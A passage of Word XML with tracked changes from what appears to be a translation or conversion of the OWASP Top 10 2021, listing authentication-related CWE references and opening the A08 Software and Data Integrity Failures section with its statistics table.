      <w:ins w:id="2828" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-306: Missing Authentication for Critical </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Function](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/306.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="187CBD9F" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2829" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2830" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-307: Improper Restriction of Excessive Authentication </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Attempts](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/307.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="048335DC" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2831" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2832" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-346: Origin Validation </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Error](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/346.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="38B5FC22" w14:textId="4239C3CD" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2833" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2834" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>384</w:t>
      </w:r>
      <w:del w:id="2835" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>.html)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2836" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">: Session </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Fixation](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/384.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="38967B92" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2837" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2838" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-521: Weak Password </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Requirements](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/521.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="000F5401" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2839" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2840" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-613: Insufficient Session </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Expiration](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/613.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6716542C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2841" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2842" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-620: Unverified Password </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Change](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/620.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5EA80376" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2843" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2844" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-640: Weak Password Recovery Mechanism for Forgotten </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Password](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/640.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6E99A76C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2845" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2846" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-798: Use of Hard-coded </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Credentials](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/798.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="17B8C71C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2847" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2848" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-940: Improper Verification of Source of a Communication </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Channel](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/940.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="26BB2DCD" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2849" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2850" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-1216: Lockout Mechanism </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Errors](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/1216.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="75D8E6E3" w14:textId="77777777" w:rsidR="00E300D6" w:rsidRDefault="00E300D6" w:rsidP="00AC649A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D1E955E"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3954F736"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"https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B9CB813" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>title:   "A08:2021 – Software and Data Integrity Failures"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="164E6222" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>id:      "A08:2021"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="581772CA"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169B9151"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69229369"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#A08:2021 – Software and Data Integrity Failures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[icon](assets/TOP_10_Icons_Final_Software_and_Data_Integrity_Failures.png){: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name="Software and Data Integrity Failures", lang=lang, source=source, parent=parent, predecessor=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>extra.osib.document</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> ~ ".2017.8") }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E7E0BD1" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7498479C" w14:textId="16F64117" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2851" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2852" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText># A8:2017 Insecure</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="11002116" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2853" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2854" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Factors</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4D0214BF" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2855" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63E2AF5D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2856" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2857"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0A6E63AC" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2858" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2859" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>|:-------------:|:--------------------:|:--------------------:|:--------------:|:--------------:|:----------------------:|:---------------------:|:-------------------:|:------------:|</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="47F26BA4" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2860" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2861" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>| 10          | 16.67%             | 2.05%              | 6.94                 | 7.94                | 75.04%       | 45.35%       | 47,972            | 1,152      |</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3A184839" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2862" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50977DC9" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2863" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2864" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">## Overview </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">{{ </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>osib</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>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 ".overview", id=id ~ "-overview", name=title ~ ": Overview", lang=lang, source=source ~ "#" ~ id, parent=</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>osib</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>) }}</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5EC16202" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2865" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3BD9C656" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2866" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2867" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>A new category for 2021 focuses on making assumptions related to</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2C9AA264" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2868" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2869" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
